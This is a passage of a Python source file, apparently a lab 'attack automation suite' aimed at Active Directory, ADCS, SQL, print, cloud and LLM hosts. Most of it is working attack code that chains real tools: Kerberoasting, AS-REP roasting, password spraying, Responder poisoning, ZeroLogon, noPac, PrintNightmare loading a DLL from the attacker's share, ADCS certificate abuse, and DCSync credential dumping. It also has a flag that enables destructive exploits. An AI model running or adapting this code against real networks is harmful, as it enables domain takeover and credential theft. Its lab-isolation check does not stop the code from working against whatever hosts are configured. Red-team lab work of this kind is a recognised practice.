                error_type=type(exc).__name__,
            )
        finally:
            if proc is not None and proc in self._child_processes:
                self._child_processes.remove(proc)

    # ========================================================================
    # ATTACK MODULES (plugins)
    # ========================================================================

    @attack(
        phase=Phase.RECON.value,
        name="AS-REP Roasting",
        description="Harvest AS-REP hashes for accounts without preauth",
        dependencies=["binary:impacket-GetNPUsers"],
    )
    async def asrep_roasting(self) -> AttackResult:
        """Perform AS-REP Roasting to harvest hashes for accounts without preauth."""
        users_content = "\n".join(self.config.service_accounts) + "\n"
        users_file = self._temp_manager.create_file(users_content)
        out_file = self._temp_manager.create_file()

        argv = [
            "impacket-GetNPUsers",
            f"{self.config.domain}/",
            "-no-pass",
            "-dc-ip",
            self.config.dc_ip,
            "-usersfile",
            users_file,
            "-format",
            "hashcat",
            "-outputfile",
            out_file,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok and Path(out_file).is_file():
            content = Path(out_file).read_text()
            count = content.count("$krb5asrep$")
            ok = count > 0
            combined_output += f"\nHashes captured: {count}"

        metadata = {
            self.META_TOOL: "impacket-GetNPUsers",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("AS-REP Roasting", Phase.RECON.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.CREDENTIAL_ATTACKS.value,
        name="Kerberoasting",
        description="Request TGS tickets for SPN-enabled accounts",
        dependencies=["binary:impacket-GetUserSPNs"],
    )
    async def kerberoasting(self) -> AttackResult:
        """Perform Kerberoasting to harvest TGS tickets for service accounts."""
        pw = self.cred("svc_kerberoast")
        out_file = self._temp_manager.create_file()

        argv = [
            "impacket-GetUserSPNs",
            f"{self.config.domain}/svc_kerberoast:{pw}",
            "-dc-ip",
            self.config.dc_ip,
            "-request",
            "-format",
            "hashcat",
            "-outputfile",
            out_file,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok and Path(out_file).is_file():
            content = Path(out_file).read_text()
            count = content.count("$krb5tgs$")
            ok = count > 0
            combined_output += f"\nHashes captured: {count}"

        metadata = {
            self.META_TOOL: "impacket-GetUserSPNs",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("Kerberoasting", Phase.CREDENTIAL_ATTACKS.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.CREDENTIAL_ATTACKS.value,
        name="GPP Password Extraction",
        description="Extract cpassword values from SYSVOL GPP XML",
        dependencies=["binary:impacket-Get-GPPPassword"],
    )
    async def gpp_extraction(self) -> AttackResult:
        """Extract cpassword values from SYSVOL Group Policy Preferences XML files."""
        pw = self.cred("svc_join")
        argv = [
            "impacket-Get-GPPPassword",
            "-username",
            "svc_join",
            "-password",
            pw,
            f"\\\\{self.config.dc_ip}\\SYSVOL",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("password", "cpassword", "user"))

        metadata = {
            self.META_TOOL: "impacket-Get-GPPPassword",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record(
            "GPP Password Extraction", Phase.CREDENTIAL_ATTACKS.value, ok, combined_output, metadata, dur
        )  # noqa: E131

    @attack(
        phase=Phase.CREDENTIAL_ATTACKS.value,
        name="SMB Relay (Responder)",
        description="Start Responder to capture NTLM challenges (smoke test only)",
        dangerous=True,
        dependencies=["binary:responder"],
    )
    async def smb_relay(self) -> AttackResult:
        """
        NOTE: This is a smoke test only. Responder runs for 5 seconds to verify
        it can bind to the interface. It is NOT sufficient time to capture hashes
        in a real attack. For actual hash capture, run Responder separately.
        """
        return await self._run_responder("SMB Relay", Phase.CREDENTIAL_ATTACKS.value, duration=5, check_hashes=False)

    @attack(
        phase=Phase.CREDENTIAL_ATTACKS.value,
        name="Password Spraying",
        description="Test common passwords against domain users",
        dependencies=["binary:crackmapexec"],
    )
    async def password_spray(self) -> AttackResult:
        """Password spraying attack using crackmapexec."""
        # Common weak passwords to test
        passwords = [
            "Password123!",
            "P@ssw0rd",
            "Winter2024!",
            "Summer2024!",
            "Qwerty123!",
            "Admin123!",
            "Welcome1!",
            "Changeme!",
        ]

        # Create a users file from configured users
        users_content = "\n".join(self.config.users.keys()) + "\n"
        users_file = self._temp_manager.create_file(users_content)

        results = []
        spray_success = False

        for password in passwords:
            argv = [
                "crackmapexec",
                "smb",
                self.config.dc_ip,
                "-u",
                users_file,
                "-p",
                password,
                "--continue-on-success",
            ]
            ok, output, _ = await self._run(argv, timeout=TIMEOUT_MEDIUM)
            combined_output = output["stdout"] + output["stderr"]

            # Check actual output for success indicators
            if parse_cme_output(combined_output):
                spray_success = True
                results.append(f"Password '{password}': SUCCESS")
                break
            else:
                results.append(f"Password '{password}': FAIL")

            # Small, randomized delay between sprays to reduce lockout risk
            await asyncio.sleep(random.uniform(2, 5))

        output_text = "\n".join(results)
        metadata = {
            self.META_TOOL: "crackmapexec",
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
            "passwords_tested": len(passwords),
        }
        return self._record(
            "Password Spraying", Phase.CREDENTIAL_ATTACKS.value, spray_success, output_text, metadata, 0.0
        )  # noqa: E131

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="ZeroLogon (CVE-2020-1472)",
        description="Exploit Netlogon authenticator bypass",
        dangerous=True,
        dependencies=["binary:impacket-cve-2020-1472"],
    )
    async def zero_logon(self) -> AttackResult:
        """Exploit Netlogon authenticator bypass to reset DC machine account password."""
        argv = [
            "impacket-cve-2020-1472",
            "DC01$",
            "-target-ip",
            self.config.dc_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("success", "exploit worked", "password set to empty"))

        metadata = {
            self.META_TOOL: "impacket-cve-2020-1472",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("ZeroLogon", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="PetitPotam (CVE-2021-36942)",
        description="Coerce DC machine account authentication",
        dependencies=["script:/opt/tools/PetitPotam/PetitPotam.py"],
    )
    async def petit_potam(self) -> AttackResult:
        """Coerce DC machine account authentication via MS-EFSRPC."""
        argv = [
            "python3",
            "/opt/tools/PetitPotam/PetitPotam.py",
            self.config.kali_ip,
            self.config.dc_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_SHORT)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("rpc_bind", "success", "pipe connected"))

        metadata = {
            self.META_TOOL: "PetitPotam.py",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("PetitPotam", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="ADCS ESC1",
        description="Enroll certificate with attacker-controlled SAN",
        dangerous=True,
        dependencies=["binary:certipy"],
    )
    async def adcs_esc1(self) -> AttackResult:
        """Enroll a certificate with an attacker-controlled SAN to impersonate an admin."""
        pw = self.cred("john.doe")
        argv = [
            "certipy",
            "req",
            "-username",
            f"john.doe@{self.config.domain}",
            "-password",
            pw,
            "-ca",
            self.config.ca_name,
            "-target",
            self.config.ca01_esc_ip,
            "-template",
            self.config.esc1_template,
            "-upn",
            f"administrator@{self.config.domain}",
            "-dc-ip",
            self.config.dc_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_LONG)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_certipy_output(combined_output)

        metadata = {
            self.META_TOOL: "certipy",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.ca01_esc_ip,
            self.META_HOST_ROLE: "certificate_authority",
        }
        return self._record("ADCS ESC1", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="ADCS ESC4",
        description="Modify vulnerable certificate template ACLs",
        dangerous=True,
        dependencies=["binary:certipy"],
    )
    async def adcs_esc4(self) -> AttackResult:
        """ESC4: Edit certificate template ACLs to allow enrollment by non-privileged users."""
        pw = self.cred("john.doe")
        argv = [
            "certipy",
            "template",
            "-username",
            f"john.doe@{self.config.domain}",
            "-password",
            pw,
            "-template",
            self.config.esc4_template,
            "-target",
            self.config.ca01_esc_ip,
            "-dc-ip",
            self.config.dc_ip,
            "-action",
            "enable",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_certipy_output(combined_output)

        metadata = {
            self.META_TOOL: "certipy",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.ca01_esc_ip,
            self.META_HOST_ROLE: "certificate_authority",
        }
        return self._record("ADCS ESC4", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="ADCS ESC7",
        description="Exploit CA with ManageCA / ManageCertificates permissions",
        dangerous=True,
        dependencies=["binary:certipy"],
    )
    async def adcs_esc7(self) -> AttackResult:
        """ESC7: Use ManageCA/ManageCertificates permissions to issue certificates."""
        pw = self.cred("john.doe")

        # First, try to get CA configuration
        argv = [
            "certipy",
            "ca",
            "-username",
            f"john.doe@{self.config.domain}",
            "-password",
            pw,
            "-target",
            self.config.ca01_esc_ip,
            "-dc-ip",
            self.config.dc_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_SHORT)
        combined_output = output["stdout"] + output["stderr"]

        if ok and ("ManageCA" in combined_output or "ManageCertificates" in combined_output):
            # If we have ManageCA/ManageCertificates, try to issue a certificate
            argv2 = [
                "certipy",
                "req",
                "-username",
                f"john.doe@{self.config.domain}",
                "-password",
                pw,
                "-ca",
                self.config.ca_name,
                "-target",
                self.config.ca01_esc_ip,
                "-template",
                self.config.subca_template,
                "-dc-ip",
                self.config.dc_ip,
            ]
            ok2, output2, _ = await self._run(argv2, timeout=TIMEOUT_MEDIUM)
            combined_output += "\n" + output2["stdout"] + output2["stderr"]
            ok = ok2 and parse_certipy_output(combined_output)

        metadata = {
            self.META_TOOL: "certipy",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.ca01_esc_ip,
            self.META_HOST_ROLE: "certificate_authority",
        }
        return self._record("ADCS ESC7", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="ADCS ESC8",
        description="Coerce authentication via Web Enrollment or RPC",
        dangerous=True,
        dependencies=["binary:certipy"],
    )
    async def adcs_esc8(self) -> AttackResult:
        """ESC8: NTLM relay to ADCS via Web Enrollment or RPC endpoints."""
        self.cred("john.doe")  # Ensure credential exists, though not used in command

        # Try to coerce authentication via HTTP to CA
        argv = [
            "certipy",
            "relay",
            "-target",
            f"{self.config.ca01_esc_ip}",
            "-server",
            self.config.kali_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_LONG)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_certipy_output(combined_output)

        metadata = {
            self.META_TOOL: "certipy",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.ca01_esc_ip,
            self.META_HOST_ROLE: "certificate_authority",
        }
        return self._record("ADCS ESC8", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="ADCS ESC9",
        description="Exploit NTLM relay to ADCS with NTLM_Relay_To_HTTP",
        dangerous=True,
        dependencies=["binary:certipy"],
    )
    async def adcs_esc9(self) -> AttackResult:
        """ESC9: NTLM relay to ADCS with NTLM_Relay_To_HTTP."""
        self.cred("john.doe")  # Ensure credential exists

        # Use NTLM relay to HTTP endpoint
        argv = [
            "certipy",
            "relay",
            "-target",
            f"http://{self.config.ca01_esc_ip}/certsrv/certfnsh.asp",
            "-server",
            self.config.kali_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_LONG)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_certipy_output(combined_output)

        metadata = {
            self.META_TOOL: "certipy",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.ca01_esc_ip,
            self.META_HOST_ROLE: "certificate_authority",
        }
        return self._record("ADCS ESC9", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="Shadow Credentials",
        description="Write msDS-KeyCredentialLink for passwordless auth",
        dependencies=["script:/opt/tools/Whisker/whisker.py"],
    )
    async def shadow_credentials(self) -> AttackResult:
        """Write msDS-KeyCredentialLink for passwordless auth to a computer object."""
        pw = self.cred("svc_join")
        argv = [
            "python3",
            "/opt/tools/Whisker/whisker.py",
            "add",
            "-t",
            self.config.vulnerable_workstation,
            "-dc-ip",
            self.config.dc_ip,
            "-u",
            "svc_join",
            "-p",
            pw,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("added", "msds-keycredentiallink", "success"))

        metadata = {
            self.META_TOOL: "whisker.py",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("Shadow Credentials", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="NoPac (CVE-2021-42287 / 42278)",
        description="SAM name spoofing for golden ticket",
        dangerous=True,
        dependencies=["script:/opt/tools/noPac/noPac.py"],
    )
    async def nopac(self) -> AttackResult:
        """Exploit SAM name spoofing to obtain a golden ticket."""
        pw = self.cred("svc_join")
        argv = [
            "python3",
            "/opt/tools/noPac/noPac.py",
            "-dc-ip",
            self.config.dc_ip,
            "-use-ldap",
            f"{self.config.domain}/svc_join:{pw}",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_LONG)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("shell", "administrator", "ticket", "success"))

        metadata = {
            self.META_TOOL: "noPac.py",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("NoPac", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="RBCD",
        description="Write msDS-AllowedToActOnBehalfOfOtherIdentity",
        dependencies=["binary:impacket-rbcd"],
    )
    async def rbcd_attack(self) -> AttackResult:
        """Write msDS-AllowedToActOnBehalfOfOtherIdentity for Resource-Based Constrained Delegation."""
        argv = [
            "impacket-rbcd",
            "-delegate-to",
            self.config.rbcd_delegate_to,
            "-delegate-from",
            self.config.rbcd_delegate_from,
            "-action",
            "write",
            "-dc-ip",
            self.config.dc_ip,
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(
                k in combined_output.lower() for k in ("success", "msds-allowedtoactonbehalfofotheridentity", "written")
            )

        metadata = {
            self.META_TOOL: "impacket-rbcd",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("RBCD", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="PrintNightmare (CVE-2021-1675)",
        description="Remote code execution via print spooler",
        dangerous=True,
        dependencies=["script:/opt/tools/PrintNightmare/CVE-2021-1675.py"],
    )
    async def print_nightmare(self) -> AttackResult:
        """Exploit the print spooler service for remote code execution."""
        pw = self.cred("svc_join")
        argv = [
            "python3",
            "/opt/tools/PrintNightmare/CVE-2021-1675.py",
            f"{self.config.print01_ip}/svc_join:{pw}",
            f"\\\\{self.config.kali_ip}\\payload.dll",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("success", "completed", "driver loaded"))

        metadata = {
            self.META_TOOL: "CVE-2021-1675.py",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.print01_ip,
            self.META_HOST_ROLE: "print_server",
        }
        return self._record("PrintNightmare", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.EXPLOITATION.value,
        name="SQL Server xp_cmdshell",
        description="Execute commands via SQL Server xp_cmdshell",
        dependencies=["binary:mssqlclient.py"],
    )
    async def sql_xp_cmdshell(self) -> AttackResult:
        """Execute commands on SQL Server using xp_cmdshell."""
        pw = self.cred("svc_sql")

        # Try to execute whoami via xp_cmdshell
        argv = [
            "mssqlclient.py",
            f"{self.config.db01_ip}/svc_sql:{pw}",
            "-dc-ip",
            self.config.dc_ip,
            "-query",
            "EXEC xp_cmdshell 'whoami';",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_SHORT)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = any(k in combined_output.lower() for k in ("output", "lab", "administrator", "svc_sql"))

        metadata = {
            self.META_TOOL: "mssqlclient.py",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.db01_ip,
            self.META_HOST_ROLE: "sql_server",
        }
        return self._record("SQL xp_cmdshell", Phase.EXPLOITATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.PRIVILEGE_ESCALATION.value,
        name="Lateral Movement (CrackMapExec)",
        description="Execute commands on remote hosts via SMB",
        dependencies=["binary:crackmapexec"],
    )
    async def lateral_movement(self) -> AttackResult:
        """Execute commands on remote hosts via SMB with valid credentials."""
        pw = self.cred("john.doe")
        argv = [
            "crackmapexec",
            "smb",
            self.config.dc_ip,
            "-u",
            "john.doe",
            "-p",
            pw,
            "-x",
            "whoami",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_MEDIUM)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_cme_output(combined_output)

        metadata = {
            self.META_TOOL: "crackmapexec",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record(
            "Lateral Movement", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur
        )  # noqa: E131

    @attack(
        phase=Phase.PRIVILEGE_ESCALATION.value,
        name="DCSync (secretsdump)",
        description="Replicate domain credentials from DC",
        dangerous=True,
        dependencies=["binary:impacket-secretsdump"],
    )
    async def dcsync_attack(self) -> AttackResult:
        """Replicate domain credentials from a Domain Controller."""
        pw = self.cred("labadmin")
        argv = [
            "impacket-secretsdump",
            "-just-dc",
            f"{self.config.domain}/labadmin:{pw}@{self.config.dc_ip}",
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_EXTENDED)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_dcsync_output(combined_output)

        metadata = {
            self.META_TOOL: "impacket-secretsdump",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record("DCSync", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur)

    @attack(
        phase=Phase.PRIVILEGE_ESCALATION.value,
        name="BloodHound Collection",
        description="Collect Active Directory data for BloodHound analysis",
        dependencies=["binary:bloodhound-python"],
    )
    async def bloodhound_collection(self) -> AttackResult:
        """Collect AD data using bloodhound-python for analysis."""
        pw = self.cred("john.doe")
        output_dir = Path(self._temp_manager.create_directory())

        argv = [
            "bloodhound-python",
            "-u",
            "john.doe",
            "-p",
            pw,
            "-d",
            self.config.domain,
            "-dc",
            self.config.dc_ip,
            "-ns",
            self.config.dc_ip,
            "-c",
            "All",
            "-v",
            "-zip",
            "-o",
            str(output_dir),
        ]
        ok, output, dur = await self._run(argv, timeout=TIMEOUT_EXTENDED)
        combined_output = output["stdout"] + output["stderr"]

        if ok:
            ok = parse_bloodhound_output(combined_output, output_dir)
            if ok:
                combined_output += f"\nBloodHound data collected in {output_dir}"

        metadata = {
            self.META_TOOL: "bloodhound-python",
            self.META_COMMAND: sanitize_command(argv),
            self.META_TARGET: self.config.dc_ip,
            self.META_HOST_ROLE: "domain_controller",
        }
        return self._record(
            "BloodHound Collection", Phase.PRIVILEGE_ESCALATION.value, ok, combined_output, metadata, dur
        )  # noqa: E131

    @attack(
        phase=Phase.PRIVILEGE_ESCALATION.value,
        name="LLMNR/NBT-NS Poisoning",
        description="Poison LLMNR and NBT-NS traffic with Responder",
        dangerous=True,
        dependencies=["binary:responder"],
    )
    async def llmnr_poisoning(self) -> AttackResult:
        """Full LLMNR/NBT-NS poisoning attack with Responder."""
        return await self._run_responder(  # noqa: R505
            "LLMNR/NBT-NS Poisoning", Phase.PRIVILEGE_ESCALATION.value, duration=30, check_hashes=True
        )

    @attack(
        phase=Phase.CLOUD_LLM.value,
        name="LLM Vulnerability Tests",
        description="OWASP Top 10 for LLM Applications probes",
    )
    async def llm_attacks(self) -> AttackResult:
        """Perform a series of vulnerability tests against an LLM application."""
        base = f"http://{self.config.llm01_ip}:8000"
        tests = [
            ("POST", "/v1/chat", {"prompt": "execute: whoami"}),
            (
                "POST",
                "/v7/execute-plugin",
                {"plugin_name": "command_executor", "params": {"cmd": "id"}},
            ),
            ("GET", "/v6/debug", None),
            ("GET", "/v10/model-info", None),
        ]

        lines: List[str] = []
        hits = 0
        t0 = time.monotonic()

        for method, path, payload in tests:
            url = f"{base}{path}"
            try:
                status, text = await self._http_request(method, url, json_payload=payload)
                lines.append(f"  {method} {path} -> {status}: {text[:200]}")
                if 200 <= status < 300:
                    hits += 1
            except Exception as exc:
                lines.append(f"  {method} {path} -> ERROR: {exc}")

        dur = time.monotonic() - t0
        output = "\n".join(lines)

        metadata = {
            self.META_TOOL: "aiohttp",
            self.META_TARGET: self.config.llm01_ip,
            self.META_HOST_ROLE: "llm_server",
            "endpoints_hit": hits,
        }
        return self._record(
            "LLM Vulnerability Tests", Phase.CLOUD_LLM.value, hits > 0, output, metadata, dur
        )  # noqa: E131

    @attack(
        phase=Phase.CLOUD_LLM.value,
        name="Cloud Misconfiguration Enumeration",
        description="Enumerate S3 buckets, IAM, secrets, Lambda",
    )
    async def cloud_enumeration(self) -> AttackResult:
        """Enumerate a simulated cloud environment for common misconfigurations."""
        # Use correct ports (4566 for LocalStack, 8080 for metadata)
        base = f"http://{self.config.cloud_pentest_ip}:4566"
        endpoints = [
            "/list-buckets",
            "/public-bucket-check",
            "/list-secrets",
            "/list-functions",
        ]

        lines: List[str] = []
        hits = 0
        t0 = time.monotonic()

        for ep in endpoints:
            try:
                status, text = await self._http_request("GET", f"{base}{ep}")
                lines.append(f"  GET {ep} -> {status}: {text[:300]}")
                if 200 <= status < 300:
                    hits += 1
            except Exception as exc:
                lines.append(f"  GET {ep} -> ERROR: {exc}")

        # Also check metadata service
        try:
            status, text = await self._http_request(
                "GET", f"http://{self.config.cloud_pentest_ip}:8080/latest/meta-data/"
            )
            lines.append(f"  GET /latest/meta-data/ -> {status}: {text[:200]}")
            if 200 <= status < 300:
                hits += 1
        except Exception as exc:
            lines.append(f"  GET metadata -> ERROR: {exc}")

        for bucket, key in [
            ("public-bucket", "leaked_creds.txt"),
            ("public-bucket", "db_passwords.txt"),
            ("internal-docs", "ssh_backup.txt"),
        ]:
            try:
                url = f"{base}/read-object?bucket={bucket}&key={key}"
                status, text = await self._http_request("GET", url)
                lines.append(f"  S3 {bucket}/{key} -> {status}: {text[:200]}")
                if 200 <= status < 300 and "error" not in text.lower():
                    hits += 1
            except Exception as exc:
                lines.append(f"  S3 {bucket}/{key} -> ERROR: {exc}")

        dur = time.monotonic() - t0
        output = "\n".join(lines)

        metadata = {
            self.META_TOOL: "aiohttp",
            self.META_TARGET: self.config.cloud_pentest_ip,
            self.META_HOST_ROLE: "cloud_simulator",
            "findings": hits,
        }
        return self._record("Cloud Enumeration", Phase.CLOUD_LLM.value, hits > 0, output, metadata, dur)  # noqa: E131

    # ========================================================================
    # Orchestrator (phased execution)
    # ========================================================================

    async def execute_all(self, phases: Optional[List[str]] = None) -> List[AttackResult]:
        """Run registered attacks in phase order."""
        self.log.info("Starting phased attack execution")

        if not await self.verify_lab_isolation():
            return []

        phase_list = phases or PHASE_ORDER

        for phase in phase_list:
            if self._shutdown_requested:
                self.log.warning("Shutdown requested — stopping before phase '%s'", phase)
                break

            descriptors = sorted(
                _ATTACK_REGISTRY.get(phase, []),
                key=lambda d: d.name,
            )
            if not descriptors:
                continue

            self.log.info("%s PHASE: %s %s", "=" * 8, phase.upper(), "=" * 8)

            for desc in descriptors:
                await self._execute_attack(desc)
                await asyncio.sleep(1)

        self.log.info("Execution complete — %d results recorded", len(self.results))
        return self.results

    async def execute_single(self, name: str) -> Optional[AttackResult]:
        """Run a single attack by name, through the same pipeline as execute_all."""
        desc = find_descriptor(name)
        if desc is None:
            return None

        if not await self.verify_lab_isolation():
            return None

        return await self._execute_attack(desc)

    # ========================================================================
    # Reporting (human + JSON)
    # ========================================================================

    def _fmt_human(self, colors: bool) -> str:
        """Format the report for human consumption."""
        sep = "=" * 80
        total = len(self.results)
        passed = sum(1 for r in self.results if r.success)

        title = f"ENTERPRISE AD LAB ATTACK AUTOMATION REPORT v{__version__}"
        if colors:
            title = f"{Fore.CYAN}{title}{Style.RESET_ALL}"

        lines = [
            sep,
            title,
            sep,
            f"Generated : {datetime.now().isoformat(timespec='seconds')}",
            f"Total     : {total}",
            f"Passed    : {passed}",
            f"Failed    : {total - passed}",
            "",
        ]

        for r in self.results:
            if colors:
                tag = f"{Fore.GREEN}[PASS]{Style.RESET_ALL}" if r.success else f"{Fore.RED}[FAIL]{Style.RESET_ALL}"
            else:
                tag = "[PASS]" if r.success else "[FAIL]"

            lines.append(f"{tag}  [{r.phase}] {r.attack_name}")
            lines.append(f"       Time     : {r.timestamp.isoformat(timespec='seconds')}")
            lines.append(f"       Duration : {r.duration_seconds:.2f}s")
            lines.append(f"       Target   : {r.metadata.get(self.META_TARGET, 'N/A')}")
            lines.append(f"       Tool     : {r.metadata.get(self.META_TOOL, 'N/A')}")
            lines.append(f"       Output   : {r.output}")
            if r.error:
                lines.append(f"       Error    : {r.error}")
            if r.error_type:
                lines.append(f"       ErrorType: {r.error_type}")
            lines.append("")

        lines += [sep, "END OF REPORT", sep]
        return "\n".join(lines)

    def _fmt_json(self) -> str:
        """Format the report as JSON."""
        payload = {
            "version": __version__,
            "generated": datetime.now().isoformat(timespec="seconds"),
            "summary": {
                "total": len(self.results),
                "passed": sum(1 for r in self.results if r.success),
                "failed": sum(1 for r in self.results if not r.success),
            },
            "results": [r.to_dict() for r in self.results],
        }
        return json.dumps(payload, indent=2)

    def print_report(self) -> None:
        """Print the human-readable report to the console."""
        print(self._fmt_human(colors=True))

    def save_report(self, base: str = "lab_report") -> Tuple[Path, Path]:
        """Save the human-readable and JSON reports to files."""
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        txt_path = Path(f"{base}_{ts}.txt")
        json_path = Path(f"{base}_{ts}.json")

        txt_path.write_text(self._fmt_human(colors=False), encoding="utf-8")
        json_path.write_text(self._fmt_json(), encoding="utf-8")

        for p in (txt_path, json_path):
            try:
                os.chmod(p, stat.S_IRUSR | stat.S_IWUSR)
            except OSError:
                pass

        self.log.info("Reports saved: %s, %s", txt_path, json_path)
        return txt_path, json_path


# ============================================================================
# CLI
# ============================================================================


async def main() -> int:
    """CLI entry point."""
    parser = argparse.ArgumentParser(
        description="Enterprise AD Lab Attack Automation Suite",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Phases: recon, credential_attacks, exploitation, privilege_escalation, cloud_llm

Safety:
  Set environment variable LAB_ATTACK_TOKEN and pass --lab-confirm <token>
  to enable execution boundary verification.

Examples:
  # Run all phases
  python3 lab_attack_automation.py --config lab.json --report

  # Run with confirmation token
  LAB_ATTACK_TOKEN=mytoken python3 lab_attack_automation.py --lab-confirm mytoken

  # Run only recon + credential_attacks
  python3 lab_attack_automation.py --phases recon credential_attacks

  # Run a single attack by name
  python3 lab_attack_automation.py --target kerberoasting

  # Disable safe mode (allow destructive exploits)
  python3 lab_attack_automation.py --no-safe-mode --report

  # List all registered attacks
  python3 lab_attack_automation.py --list-attacks
        """,
    )
    parser.add_argument("-c", "--config", help="Path to JSON config file")
    parser.add_argument("-r", "--report", action="store_true", help="Save TXT + JSON reports after execution")
    parser.add_argument("-t", "--target", help="Run a single attack by name")
    parser.add_argument("-p", "--phases", nargs="+", help="Run only specific phases")
    parser.add_argument(
        "--no-safe-mode", action="store_true", help="Allow destructive exploits (ZeroLogon, NoPac, etc.)"
    )
    parser.add_argument("--lab-confirm", help="Lab confirmation token (must match LAB_ATTACK_TOKEN env)")
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--list-attacks", action="store_true", help="List registered attacks and exit")
    args = parser.parse_args()

    if args.verbose:
